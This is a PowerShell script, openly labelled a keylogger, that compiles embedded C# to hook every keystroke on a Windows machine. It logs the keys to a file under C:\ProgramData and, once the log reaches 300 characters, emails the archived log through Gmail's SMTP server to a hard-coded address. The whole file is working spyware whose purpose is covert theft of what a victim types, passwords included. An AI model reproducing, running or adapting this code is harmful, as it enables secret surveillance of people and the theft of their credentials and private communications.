#Powershell keylogger
#author vadill0
Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Runtime.CompilerServices;
using System.Net.Mail;
using System.Net;
using System.Threading;

namespace Keylogger
{
    public static class Program
    {
        private const string MAIL = "rattesgordi@gmail.com";
        private const string PASS = "";
        private const string LOG_FILE = @"C:\ProgramData\log.txt";
        private const string ARCHIVE_FILE = @"C:\ProgramData\log_archive.txt";
        private const int MAX_LOG_LENGHT = 300;
        private static string buffer = "";
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private static IntPtr hook = IntPtr.Zero;
        private static LowLevelKeyboardProc llkProcedure = HookCallback;
        static void Main(string[] args)
        {
            hook = SetHook(llkProcedure);
            Application.Run();
            UnhookWindowsHookEx(hook);
        }

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {

            if (buffer.Length >= 0)
            {
                StreamWriter output = new StreamWriter(LOG_FILE, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            FileInfo logFile = new FileInfo(LOG_FILE);

            if (logFile.Exists && logFile.Length >= MAX_LOG_LENGHT)
            {
                try
                {
                    logFile.CopyTo(ARCHIVE_FILE, true);

                    logFile.Delete();

                    Thread mailThread = new Thread(Program.sendMail);
                    Console.Out.WriteLine("\n\n**MAILSENDING**\n");
                    mailThread.Start();
                }
                catch (Exception e)
                {
                    Console.Out.WriteLine(e.Message);
                }
            }

            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                if (((Keys)vkCode).ToString() == "OemPeriod")
                {
                    Console.Out.Write(".");
                    buffer += ".";
                }
                else if (((Keys)vkCode).ToString() == "Oemcomma")
                {
                    Console.Out.Write(",");
                    buffer += ",";
                }
                else if (((Keys)vkCode).ToString() == "Space")
                {
                    Console.Out.Write(" ");
                    buffer += " ";
                }
                else
                {
                    Console.Out.Write((Keys)vkCode);
                    buffer += (Keys)vkCode;
                }
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            Process currentProcess = Process.GetCurrentProcess();
            ProcessModule currentModule = currentProcess.MainModule;
            String moduleName = currentModule.ModuleName;
            IntPtr moduleHandle = GetModuleHandle(moduleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, llkProcedure, moduleHandle, 0);
        }


        public static void sendMail()
        {
            try
            {
                SmtpClient client = new SmtpClient("smtp.gmail.com")
                {
                    Port = 587,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    UseDefaultCredentials = false,
                    Credentials = new NetworkCredential(MAIL, PASS),
                    EnableSsl = true,
                };

                MailMessage message = new MailMessage
                {
                    From = new MailAddress(MAIL),
                    Subject = DateTime.Now.Month + "." + DateTime.Now.Day + "." + DateTime.Now.Year,
                    Body = $"{DateTime.Now}",
                    IsBodyHtml = false,
                };
                   
                Attachment attachment = new Attachment(ARCHIVE_FILE, System.Net.Mime.MediaTypeNames.Text.Plain);
                message.Attachments.Add(attachment);


                message.To.Add(MAIL);

                client.Send(message);

                message.Dispose();
            }
            catch (Exception e)
            {
                Console.Out.WriteLine(e.Message);
            }
        }


        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);


        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);
        
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(String moduleName);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms
[Keylogger.Program]::Main();
